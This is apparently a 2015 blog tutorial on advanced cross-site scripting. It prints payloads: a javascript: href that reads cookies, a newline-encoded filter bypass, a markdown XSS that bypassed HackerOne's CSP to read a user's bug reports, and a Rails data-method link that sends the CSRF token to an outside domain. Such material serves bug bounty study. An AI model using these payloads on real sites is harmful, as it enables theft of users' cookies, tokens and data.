---
title: advanced cross site scripting part 1
updated: 2015-11-26
tags: hackerone,xss,cross site scripting,csp bypass,href xss,stored xss,reflected xss,dom xss,google xss,csrf,ruby
---
> Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications.
XSS enables attackers to inject client-side script into web pages viewed by other users.

Yeah you know about that . Let's dive deep into the cross site scripting . Now a days xss is not just inserting 
`"><img src=x onerror=prompt(9)>` .There are some clever hacks for cross site scripting . Some people redefined the way 
attackers can perform xss.
now think of `<a>` tag . Commonly known attack is inserting `javascript:alert(document.cookie)` into href . 

```html
<a href="javascript:alert(document.cookie)">lol</a>
```
But there are some filters those need an protocol like `{anything}://` . But this one dosen't executes 
`javascript://alert(document.cookie)` . To bypass this one we need some characters like %0a%0d . Final payload

```html
<a href="javascript://%0a%0dalert(document.cookie)">lol</a>
```
This one is basic too. Now we will discuss about a rare xss found by danlec which bypassed strong csp of hackerone.
Hackerone uses daring fireball as markdown [https://daringfireball.net/projects/markdown/basics](https://daringfireball.net/projects/markdown/basics).
Danlec found that `<http://\<h1\>test\</h1\>>` rendered to `http://<h1>test</h1>`
Hackerone uses strong csp but some one can access the information of the user bugs 

```
<http://\<img\ src=0\ onerror=\"$.getJSON(\'/bugs\',function(a){alert(JSON.stringify(a));})\"\>>
```

Some can send csrf token to other domain by a link handle bypass

```html
<a href="http://danlec.com" data-method="post">Proof of Concept</a>
```

`data-method="post"` Normally url's are get requests but ruby has an option of adding post method . Ruby sends `X-Csrf-Token`
with the post request so any url there can catch the csrf token at server side .


Visit my next article about advanced xss [http://withintech.com/notes/xss-cross-site-scripting-2](http://withintech.com/notes/xss-cross-site-scripting-2)

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- mobile ad -->
<ins class="adsbygoogle"
     style="display:inline-block;width:320px;height:100px"
     data-ad-client="ca-pub-6760357694701522"
     data-ad-slot="9506986493"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
